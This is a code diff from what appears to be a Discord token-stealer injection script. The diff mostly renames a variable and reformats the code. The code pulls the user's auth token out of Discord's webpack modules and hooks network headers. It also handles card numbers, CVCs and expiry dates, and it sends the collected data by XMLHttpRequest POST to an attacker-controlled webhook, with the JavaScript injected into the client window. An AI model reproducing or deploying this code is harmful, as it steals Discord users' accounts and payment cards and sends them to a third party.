@@ -8,10 +8,10 @@ const UrlFilter = {
 };
 
 const TokenEval = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`
-var sexhook = "dumbass";
+var webhook = "dumbass";
 
 session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
-    if (details.url.startsWith(sexhook)) {
+    if (details.url.startsWith(webhook)) {
         if (details.url.includes("discord.com")) {
             callback({
                 responseHeaders: Object.assign({
@@ -492,14 +492,14 @@ function CreditCardAdded(number, cvc, expir_month, expir_year, token) {
 
 
 //🕺🕺🕺🕺assets
-function SendToWebhook(info) {
-    const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();
-        xhr.open("POST", "${sexhook}", true);
-        xhr.setRequestHeader('Content-Type', 'application/json');
-        xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
-        xhr.send(JSON.stringify(${info}));
-    `, !0)
+function SendToWebhook(what) {
+	const window = BrowserWindow.getAllWindows()[0];
+	window.webContents.executeJavaScript(`    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "${webhook}", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.setRequestHeader('Access-Control-Allow-Origin', '*');
+    xhr.send(JSON.stringify(${what}));
+    `, !0).then((token => {}))
 }
 
 
